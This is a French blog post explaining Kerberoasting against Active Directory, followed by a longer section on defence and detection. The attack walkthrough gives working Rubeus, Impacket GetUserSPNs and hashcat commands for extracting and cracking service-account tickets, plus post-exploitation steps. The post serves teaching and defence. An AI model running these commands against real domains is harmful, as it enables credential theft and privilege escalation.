---
title: "Kerberoasting - Explication simplifiée"
description: "Proposition d'analyse de l'attaque Kerberoasting : flux d'attaque, extraction de hash, cassage offline et stratégies de défense en profondeur."
slug: kerberoasting
date: 2025-02-08
categories:
  - Active Directory
tags:
  - Kerberos
  - Kerberoasting
  - Pentest
  - Active Directory
  - Windows Security
---

## L' Attaque Kerberoasting

### Étape 0 : Contexte initial

L'attaquant dispose d'un **compte utilisateur standard compromis** (via phishing, password spray, etc.) sur le domaine `CORP.LOCAL`. Il ne possède aucun privilège administrateur et cherche à élever ses privilèges.

> **Point de départ :** L'attaquant a déjà compromis un compte utilisateur basique. Il cherche maintenant à élever ses privilèges.

---

### Étape 1 : Énumération des SPN

L'attaquant interroge l'Active Directory pour lister tous les comptes possédant un **Service Principal Name (SPN)**.

```powershell
# PowerShell - Énumération des SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName |
    Select Name, ServicePrincipalName
```

**Résultat de l'énumération :**

| Compte | SPN |
|--------|-----|
| `svc_sql_prod` | `MSSQLSvc/srv-sql01.corp.local:1433` |
| `svc_exchange` | `exchangeMDB/mail.corp.local` |
| `svc_backup_admin` | `cifs/backup-srv.corp.local` |
| `svc_sharepoint` | `HTTP/sharepoint.corp.local` |

> **Cibles prioritaires :** Les comptes avec des noms comme "admin", "backup", "migration" sont souvent membres de groupes privilégiés (Domain Admins, Backup Operators...).

---

### Étape 2 : Demande de ticket de Service - ST (Délivré par TGS)

1. **Attaquant → KDC :** "Je veux accéder au service `MSSQLSvc/srv-sql01.corp.local:1433`" *(avec mon TGT valide comme preuve d'identité)*

2. **Le KDC vérifie :**
   - TGT valide ? **OUI**
   - Utilisateur authentifié ? **OUI**
   - Service existe ? **OUI**
   - **Il n'y a auucune vérification à propos de l'utilisation du service par l'utilisateur**

3. **KDC → Attaquant :** "Voici ton TGS pour accéder à SQL Server"
   - **Le TGS est chiffré avec le Hash NTLM du password du compte `svc_sql_prod`**

```bash
# Avec Rubeus (outil de pentest)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Avec Impacket (Python)
GetUserSPNs.py CORP.LOCAL/jean:password -dc-ip 192.168.1.10 -request
```

> **Du point de vue des processus, c'est une opération 100% légitime :** Aucune tentative de connexion au serveur SQL, aucun échec d'authentification, aucune alerte générée par défaut. Kerberos fonctionne comme prévu.

---

### Étape 3 : Extraction du hash depuis le TGS

Le ticket TGS reçu est parsé pour en extraire le hash au format Hashcat :

```
$krb5tgs$23$*svc_sql_prod$CORP.LOCAL$MSSQLSvc/srv-sql01.corp.local:1433*$
a1b2c3d4e5f6789abcdef0123456789abcdef0123456789abcdef0123456789
[...données chiffrées avec le hash NTLM du password...]
xyz9876543210fedcba9876543210fedcba9876543210fedcba9876543210
```

**Ce que contient ce hash :**

- **Partie publique :** nom du compte (`svc_sql_prod`), domaine (`CORP.LOCAL`), SPN demandé
- **Partie chiffrée (la cible) :** données chiffrées avec le Hash NTLM du password de `svc_sql_prod` — c'est cette partie que l'attaquant va chercher à casser

---

### Étape 4 : Cassage offline du hash (Brute Force)

> **Note :** Cette étape se passe sur la machine de l'attaquant, complètement **offline**. Aucune connexion au réseau.

```bash
# Hashcat - Cassage du hash TGS
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# -m 13100 = Mode Kerberos 5 TGS-REP etype 23 (RC4)
# rockyou.txt = Dictionnaire de 14 millions de passwords
```

Le processus de cassage :

1. **Test :** `Password123` → Calcul du Hash NTLM → Comparaison → ❌
2. **Test :** `Welcome2024` → Calcul du Hash NTLM → Comparaison → ❌
3. **Test #458,392 :** `SqlService2019!` → Calcul du Hash NTLM → Comparaison → ✅ **CORRESPONDANCE !**

**PASSWORD CRAQUÉ !**
- **Compte :** `svc_sql_prod`
- **Password :** `SqlService2019!`

> **Pourquoi c'est dangereux :** Aucune limite de tentatives (pas de lockout), aucune alerte en temps réel, peut prendre des jours/semaines sans détection, l'attaquant peut utiliser un cluster GPU massif.

---

### Étape 5 : Exploitation post-compromission

```powershell
runas /user:CORP\svc_sql_prod cmd.exe
# Password: SqlService2019!
```

```powershell
whoami /groups
# Résultat :
# CORP\Domain Admins
# CORP\Backup Operators
# CORP\Schema Admins
```

**Avec Domain Admins, l'attaquant peut :**
- Dumper tous les hashs NTLM du domaine (DCSync)
- Créer des comptes admin persistants
- Installer des backdoors sur tous les serveurs
- Exfiltrer toutes les données sensibles
- Déployer des ransomwares sur tout le réseau

---

### Récapitulatif de l'attaque

| Étape | Action | Détectable ? | Privilèges requis |
|-------|--------|-------------|-------------------|
| **1. Énumération SPN** | Requête LDAP dans AD | ❌ Difficile | Utilisateur standard |
| **2. Demande TGS** | Requête Kerberos légitime | ❌ Non par défaut | Utilisateur standard |
| **3. Extraction hash** | Parsing du ticket local | ❌ Aucune trace réseau | Aucun |
| **4. Cassage offline** | Brute force local | ❌ Complètement invisible | Aucun |
| **5. Exploitation** | Authentification légitime | ⚠️ Possible | Domain Admin (si compte ciblé) |

---

## Défenses contre le Kerberoasting

### Stratégie de défense en profondeur

La défense doit être multi-couches :

- **Prévention :** Empêcher l'attaque de réussir, rendre le cassage impossible
- **Détection :** Identifier l'attaque en cours, alertes en temps réel, honeypots
- **Réponse :** Isolation rapide, révocation des tickets, investigation forensique

---

### 1. Passwords complexes pour les comptes de service

**Objectif :** Rendre le cassage du hash **mathématiquement impossible**.

**Password FAIBLE (cassable en 5 minutes) :**
```
SqlService2019!
```
- 15 caractères, motif courant (mot + année + symbole), présent dans les dictionnaires

**Password FORT (cassage : plusieurs millénaires) :**
```
X9$mK#pL2@vN8!qR4&wT6^yU
```
- 25+ caractères, aléatoire complet, temps de cassage estimé : **6,7 milliards d'années**

| Longueur | Complexité | Temps de cassage (RTX 4090) | Recommandation |
|----------|-----------|---------------------------|----------------|
| 8 caractères | Alphanumérique | 2 secondes | ❌ Dangereux |
| 12 caractères | + Symboles | 3 minutes | ❌ Insuffisant |
| 15 caractères | + Symboles | 2 jours | ⚠️ Faible |
| 20 caractères | + Symboles | 850 ans | ✅ Acceptable |
| 25+ caractères | + Symboles | Milliards d'années | ✅ Recommandé |

```powershell
# PowerShell - Génération d'un password fort (25 caractères)
-join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42,43,45,46,47,58,61,63,64,94) |
    Get-Random -Count 25 |
    ForEach-Object {[char]$_})
```

---

### 2. Déploiement de gMSA (Group Managed Service Accounts)

**Solution :** Les gMSA sont des comptes de service dont le password est **généré et géré automatiquement par Active Directory**.

**Avantages gMSA :**
- Password de 120 caractères (impossible à casser)
- Rotation automatique tous les 30 jours
- Aucun humain ne connaît le password
- Immunité totale contre Kerberoasting

```powershell
# 1. Créer la KDS Root Key (une fois par domaine)
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

# 2. Créer le gMSA
New-ADServiceAccount -Name "gMSA-SQL-Prod" `
    -DNSHostName "srv-sql01.corp.local" `
    -PrincipalsAllowedToRetrieveManagedPassword "SRV-SQL01$"

# 3. Installer sur le serveur SQL
Install-ADServiceAccount -Identity "gMSA-SQL-Prod"

# 4. Configurer le service SQL pour utiliser le gMSA
# Compte : CORP\gMSA-SQL-Prod$
# Password : (laissez vide - géré automatiquement)
```

> Le compte `gMSA-SQL-Prod$` a un password de 120 caractères aléatoires qui change automatiquement tous les 30 jours.

---

### 3. Forcer le chiffrement AES (désactiver RC4)

L'algorithme RC4 (type 23) est obsolète et beaucoup plus rapide à casser que AES.

| Algorithme | Type Kerberos | Vitesse de cassage | Recommandation |
|-----------|--------------|-------------------|----------------|
| RC4-HMAC | Type 23 | 100 milliards hash/s | ❌ À DÉSACTIVER |
| AES128-CTS | Type 17 | 10 millions hash/s | ✅ Acceptable |
| AES256-CTS | Type 18 | 5 millions hash/s | ✅ Recommandé |

Forcer AES256 ralentit drastiquement le cassage.

```
# GPO - Désactivation de RC4
# Computer Configuration → Windows Settings → Security Settings →
# Local Policies → Security Options
# "Network security: Configure encryption types allowed for Kerberos"

☑ AES128_HMAC_SHA1
☑ AES256_HMAC_SHA1
☐ RC4_HMAC_MD5      ← DÉSACTIVER
☐ DES_CBC_CRC       ← DÉSACTIVER
☐ DES_CBC_MD5       ← DÉSACTIVER
```

---

### 4. Principe du moindre privilège

**Erreur critique fréquente :** Les comptes de service sont membres de **Domain Admins** "pour simplifier les permissions".

- ❌ `svc_sql_prod` membre de **Domain Admins** → Si cassé = compromission totale possible
- ✅ `svc_sql_prod` avec permissions minimales (lecture/écriture SQL uniquement) → Si cassé = impact limité

> **Note:** Un compte de service ne doit jamais être Domain Admin. Il est recommandé d'utiliser des groupes dédiés avec des permissions granulaires.

---

### 5. Détection via Event Logs (SIEM)

**Event ID 4769 :** Chaque demande de TGS génère cet événement sur le contrôleur de domaine.

**Patterns suspects :**
- Volume anormal : +10 TGS en 5 minutes
- SPN rarement utilisés
- Encryption Type = RC4 (0x17)
- Requêtes hors heures ouvrables

```sql
-- Splunk Query Example - Détection Kerberoasting
index=windows EventCode=4769
| where TicketEncryptionType="0x17"
| where ServiceName!="krbtgt" AND ServiceName!="*$"
| stats count by src_ip, user, ServiceName
| where count > 5
| table _time, user, src_ip, ServiceName, count
```

```sql
-- Azure Sentinel Query Example(KQL) - Détection avancée
SecurityEvent
| where EventID == 4769
| where ServiceName !endswith "$" and ServiceName != "krbtgt"
| where TicketEncryptionType == "0x17"
| summarize
    RequestCount = count(),
    UniqueServices = dcount(ServiceName),
    Services = make_set(ServiceName)
    by Account, IpAddress, bin(TimeGenerated, 5m)
| where RequestCount > 5 OR UniqueServices > 3
```

---

### 6. Honeypot SPN (Canary Tokens)

**Stratégie :** Créer des comptes de service "leurres" avec des noms attractifs. **Toute demande de TGS = attaque confirmée**.

```powershell
# 1. Créer le compte avec un nom attractif
New-ADUser -Name "SQL_Backup_Admin" `
    -AccountPassword (ConvertTo-SecureString "Tr3sC0mpl3x3P@ssw0rd!2024#Sec" -AsPlainText -Force) `
    -Enabled $true `
    -Description "HONEYPOT - Ne pas utiliser"

# 2. Attribuer un SPN
setspn -A MSSQLSvc/honeypot-backup.corp.local:1433 SQL_Backup_Admin

# 3. Configurer une alerte SIEM
# Event 4769 WHERE ServiceName = "MSSQLSvc/honeypot-backup.corp.local:1433"
# → Alerte immédiate
```

**Examples de noms attractifs pour honeypots :** `SQL_Admin_Backup`, `Exchange_Migration_Svc`, `VMware_vCenter_Admin`, `Backup_Domain_Admin`, `SAP_Super_User`

---

### 7. Rotation régulière des passwords

- ❌ Password défini en 2015 → Jamais changé depuis 10 ans
- ✅ Rotation tous les 90 jours (minimum) / 30 jours (recommandé)
- ✅ Automatisée via scripts ou gMSA

---

### 8. Audit continu des comptes de service

```powershell
$ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName, MemberOf, PasswordLastSet, Enabled

foreach ($account in $ServiceAccounts) {
    $groups = $account.MemberOf | ForEach-Object {
        (Get-ADGroup $_).Name
    }

    $isDomainAdmin = $groups -contains "Domain Admins"
    $passwordAge = (Get-Date) - $account.PasswordLastSet

    [PSCustomObject]@{
        Account = $account.Name
        SPN = $account.ServicePrincipalName -join "; "
        IsDomainAdmin = $isDomainAdmin
        PasswordAgeDays = $passwordAge.Days
        Enabled = $account.Enabled
        Alert = ($isDomainAdmin -or $passwordAge.Days -gt 90)
    }
}
```

---

### Playbook de réponse à incident

1. **Isolation immédiate (< 5 min) :** Bloquer l'IP source, désactiver le compte compromis, isoler la machine.
2. **Révocation et rotation (< 15 min) :** Reset des passwords de tous les comptes SPN, purge des tickets Kerberos, révocation des sessions.
3. **Investigation (< 1h) :** Memory dump, analyse des Event Logs sur 30 jours, recherche de reconnaissance LDAP.
4. **Hardening post-incident :** Déploiement gMSA, désactivation RC4, honeypots SPN, renforcement SIEM.

---

### Checklist de sécurité Kerberos

| Mesure de Sécurité | Priorité | Difficulté | Impact |
|-------------------|----------|-----------|--------|
| Audit des comptes SPN existants | Critique | Facile | Visibilité |
| Passwords 25+ caractères pour SPN | Critique | Facile | Prévention |
| Déploiement de gMSA | Critique | Moyen | Protection complète |
| Désactivation de RC4 (forcer AES) | Critique | Moyen | Ralentit le cassage |
| Retrait des SPN de Domain Admins | Critique | Facile | Réduction impact |
| Monitoring Event ID 4769 | Élevée | Moyen | Détection |
| Honeypot SPN | Élevée | Facile | Alerte précoce |
| Rotation passwords (90 jours) | Moyenne | Moyen | Limitation temporelle |
| Playbook de réponse documenté | Élevée | Facile | Réaction rapide |
